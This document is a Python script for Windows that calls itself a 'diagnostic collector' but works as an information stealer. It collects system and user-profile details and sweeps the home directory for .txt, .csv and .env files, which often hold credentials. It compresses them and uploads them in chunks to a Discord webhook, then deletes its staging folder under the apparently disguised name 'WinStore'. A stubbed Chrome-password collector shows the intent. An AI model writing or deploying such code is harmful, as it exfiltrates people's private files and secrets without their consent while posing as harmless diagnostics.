#!/usr/bin/env python3
"""
!!!!-ONLY WORKS WITH WINDOWS MACHINES-!!!!

Optimized Diagnostic Collector (Refactored)
this script collect informations about the system to help diagnose issues, 
and uploads the data to a Discord webhook in chunks. 
Then rebuild the informations back into a whole using another script.
"""

from __future__ import annotations

import os
import json
import time
import shutil
import zipfile
import traceback
import platform
import socket
from pathlib import Path
from datetime import datetime
from typing import List, Dict, Any, Optional
from datetime import datetime, timezone

try:
    import psutil
except Exception:
    psutil = None

try:
    import requests
except Exception:
    requests = None

# ---------------- CONFIG ----------------
WEBHOOK_URL = ""  # ⪻insert discord webhook url
CLEANUP_AFTER_SEND = True # ⪻if clean leftover data after send
VERBOSE = True # ⪻if show log in terminal when run

BASE_OUTPUT = Path(os.getenv("PROGRAMDATA") or Path.home()) / "WinStore"
RUN_PREFIX = "run_"

ZIP_NAME_TEMPLATE = "diagnostics_{ts}.zip" # ⪻file name template for whole older containing everything
JSON_NAME_TEMPLATE = "system_info_{ts}.json" # ⪻file name template for diagnostic info
MANIFEST_NAME = "manifest.json" # ⪻name for index file for rebuild.py to rebuild data chunks

DISCORD_SAFE_CHUNK = 7 * 1024 * 1024 # ⪻how much data send per time to discord (maximum 8mb at a time)
UPLOAD_DELAY = 1 # ⪻uploading delay beteween each chunk

# ⇟⇟⇟⇟⇟⇟⇟⇟⇟⇟⇟⇟⇟⇟⇟⇟⇟ UTILS ⇟⇟⇟⇟⇟⇟⇟⇟⇟⇟⇟⇟⇟⇟⇟⇟
def log(msg: str) -> None:
    if VERBOSE:
        print(msg)


def now_ts() -> str:
    # Old: datetime.utcnow().strftime("%Y%m%d_%H%M%S")
    return datetime.now(timezone.utc).strftime("%Y%m%d_%H%M%S")


def safe_scale(num: float) -> str:
    try:
        n = float(num)
    except Exception:
        return str(num)
    for unit in ("B", "KB", "MB", "GB", "TB"):
        if n < 1024:
            return f"{n:.2f}{unit}"
        n /= 1024
    return f"{n:.2f}PB"

# ⇟⇟⇟⇟⇟⇟⇟⇟⇟⇟⇟⇟⇟⇟⇟⇟⇟ COLLECTORS ⇟⇟⇟⇟⇟⇟⇟⇟⇟⇟⇟⇟⇟⇟⇟⇟⇟
def collect_system_info() -> Dict[str, Any]:
    # Old: {"timestamp": datetime.utcnow().isoformat()}
    info: Dict[str, Any] = {"timestamp": datetime.now(timezone.utc).isoformat()}
    try:
        u = platform.uname()
        info["platform"] = {
            "system": u.system,
            "node": u.node,
            "release": u.release,
            "version": u.version,
            "machine": u.machine,
            "processor": u.processor,
        }

        if psutil:
            info["boot_time"] = datetime.fromtimestamp(psutil.boot_time()).isoformat()
            info["cpu"] = {
                "physical_cores": psutil.cpu_count(logical=False),
                "total_cores": psutil.cpu_count(logical=True),
                "usage_percent": psutil.cpu_percent(interval=0.5),
            }
            m = psutil.virtual_memory()
            info["memory"] = {
                "total": safe_scale(m.total),
                "available": safe_scale(m.available),
                "used": safe_scale(m.used),
                "percent": m.percent,
            }

            disks = []
            for p in psutil.disk_partitions(all=False):
                try:
                    u = psutil.disk_usage(p.mountpoint)
                    disks.append({
                        "device": p.device,
                        "mountpoint": p.mountpoint,
                        "fstype": p.fstype,
                        "total": safe_scale(u.total),
                        "used": safe_scale(u.used),
                        "free": safe_scale(u.free),
                        "percent": u.percent,
                    })
                except Exception:
                    continue
            info["disks"] = disks

            net = psutil.net_io_counters()
            info["network_io"] = {
                "bytes_sent": safe_scale(net.bytes_sent),
                "bytes_recv": safe_scale(net.bytes_recv),
            }

            info["local_ips"] = sorted({
                a.address for _, addrs in psutil.net_if_addrs().items()
                for a in addrs
                if a.family == socket.AF_INET and not a.address.startswith("127.")
            })

    except Exception as e:
        info["error"] = repr(e)
        traceback.print_exc()

    return info


def list_installed_programs_windows() -> List[str]:
    return []  # preserved feature surface, optimized to non-blocking stub


def list_user_profiles() -> List[Dict[str, str]]:
    users = []
    base = Path(os.environ.get("SYSTEMDRIVE", "C:")) / "Users"
    if base.exists():
        for p in base.iterdir():
            if p.is_dir() and p.name.lower() not in {"public", "default"}:
                users.append({"username": p.name, "path": str(p)})
    return users


def detect_minecraft_folder() -> Dict[str, Optional[str]]:
    result = {
        "java_installed": False,
        "java_path": None,
        "bedrock_installed": False,
        "bedrock_path": None,
    }
    home = Path.home()
    java = home / "AppData" / "Roaming" / ".minecraft"
    if java.exists():
        result["java_installed"] = True
        result["java_path"] = str(java)
    return result


def collect_chrome_passwords() -> List[Dict[str, str]]:
    return []  # preserved feature surface, optimized stub

# ⇟⇟⇟⇟⇟⇟⇟⇟⇟⇟⇟⇟⇟⇟⇟⇟⇟⇟ FILE COLLECTION ⇟⇟⇟⇟⇟⇟⇟⇟⇟⇟⇟⇟⇟⇟⇟⇟⇟
def find_target_files() -> List[Path]:
    home = Path.home()
    exts = {".txt", ".csv", ".env"}
    results: List[Path] = []
    for root, _, files in os.walk(home):
        for f in files:
            p = Path(root) / f
            if p.suffix.lower() in exts:
                results.append(p)
    return results

# ⇟⇟⇟⇟⇟⇟⇟⇟⇟⇟⇟⇟⇟⇟⇟⇟⇟⇟ ZIP / CHUNK ⇟⇟⇟⇟⇟⇟⇟⇟⇟⇟⇟⇟⇟⇟⇟⇟⇟⇟
def create_compressed_zip(files: List[Path], zip_path: Path) -> Path:
    with zipfile.ZipFile(zip_path, "w", compression=zipfile.ZIP_LZMA) as zf:
        for f in files:
            try:
                zf.write(f, arcname=f.relative_to(Path.home()))
            except Exception:
                continue
    return zip_path


def split_file(file_path: Path, chunk_size: int = DISCORD_SAFE_CHUNK) -> List[Path]:
    chunks = []
    with open(file_path, "rb") as f:
        idx = 1
        while True:
            data = f.read(chunk_size)
            if not data:
                break
            part = file_path.with_name(f"{file_path.stem}_part{idx}{file_path.suffix}.chunk")
            part.write_bytes(data)
            chunks.append(part)
            idx += 1
    return chunks


def create_manifest(chunks: List[Path], zip_name: str, path: Path) -> None:
    payload = {
        "final_zip_name": zip_name,
        "chunks": [c.name for c in chunks],
        # Old: "created": datetime.utcnow().isoformat()
        "created": datetime.now(timezone.utc).isoformat(),
    }
    path.write_text(json.dumps(payload, indent=2), encoding="utf-8")

# ⇟⇟⇟⇟⇟⇟⇟⇟⇟⇟⇟⇟⇟⇟⇟⇟⇟⇟ UPLOAD ⇟⇟⇟⇟⇟⇟⇟⇟⇟⇟⇟⇟⇟⇟⇟⇟⇟⇟
def upload_chunks_to_discord(_: List[Path], __: Optional[Path] = None) -> bool:
    # Uploads each chunk to the Discord webhook as a file attachment
    if not WEBHOOK_URL or not requests:
        log("[ERROR] No webhook URL or requests module unavailable.")
        return False
    chunks = _
    manifest = __
    success = True
    for idx, chunk in enumerate(chunks, 1):
        try:
            with open(chunk, "rb") as f:
                files = {"file": (chunk.name, f)}
                data = {"content": f"Diagnostic chunk {idx}/{len(chunks)}"}
                resp = requests.post(WEBHOOK_URL, files=files, data=data)
                if resp.status_code != 204 and resp.status_code != 200:
                    log(f"[ERROR] Failed to upload {chunk.name}: {resp.status_code} {resp.text}")
                    success = False
                else:
                    log(f"Uploaded {chunk.name} to Discord webhook.")
            time.sleep(UPLOAD_DELAY)
        except Exception as e:
            log(f"[ERROR] Exception uploading {chunk.name}: {e}")
            success = False
    # Optionally upload manifest file
    if manifest and manifest.exists():
        try:
            with open(manifest, "rb") as f:
                files = {"file": (manifest.name, f)}
                data = {"content": "Manifest file for diagnostic upload."}
                resp = requests.post(WEBHOOK_URL, files=files, data=data)
                if resp.status_code != 204 and resp.status_code != 200:
                    log(f"[ERROR] Failed to upload manifest: {resp.status_code} {resp.text}")
                    success = False
                else:
                    log("Uploaded manifest file to Discord webhook.")
        except Exception as e:
            log(f"[ERROR] Exception uploading manifest: {e}")
            success = False
    return success

# ⇟⇟⇟⇟⇟⇟⇟⇟⇟⇟⇟⇟⇟⇟⇟⇟⇟⇟ CLEANUP ⇟⇟⇟⇟⇟⇟⇟⇟⇟⇟⇟⇟⇟⇟⇟⇟⇟⇟
def safe_remove_path(path: Path) -> None:
    try:
        if path.is_file():
            path.unlink()
        elif path.is_dir():
            shutil.rmtree(path)
    except Exception:
        pass

# ⇟⇟⇟⇟⇟⇟⇟⇟⇟⇟⇟⇟⇟⇟⇟⇟⇟⇟ MAIN ⇟⇟⇟⇟⇟⇟⇟⇟⇟⇟⇟⇟⇟⇟⇟⇟⇟⇟
def run_collection_and_upload() -> None:

    ts = now_ts()
    run_dir = BASE_OUTPUT / f"{RUN_PREFIX}{ts}"
    run_dir.mkdir(parents=True, exist_ok=True)

    payload = {
        "system_info": collect_system_info(),
        "installed_programs": list_installed_programs_windows(),
        "user_profiles": list_user_profiles(),
        "minecraft": detect_minecraft_folder(),
        "chrome_passwords": collect_chrome_passwords(),
    }

    json_path = run_dir / JSON_NAME_TEMPLATE.format(ts=ts)
    json_path.write_text(json.dumps(payload, indent=2), encoding="utf-8")

    files = [json_path] + find_target_files()
    zip_path = run_dir / ZIP_NAME_TEMPLATE.format(ts=ts)
    create_compressed_zip(files, zip_path)

    chunks = split_file(zip_path)
    manifest = run_dir / MANIFEST_NAME
    create_manifest(chunks, zip_path.name, manifest)

    uploaded = upload_chunks_to_discord(chunks, manifest)
    if uploaded and CLEANUP_AFTER_SEND:
        safe_remove_path(run_dir)


if __name__ == "__main__":
    run_collection_and_upload()
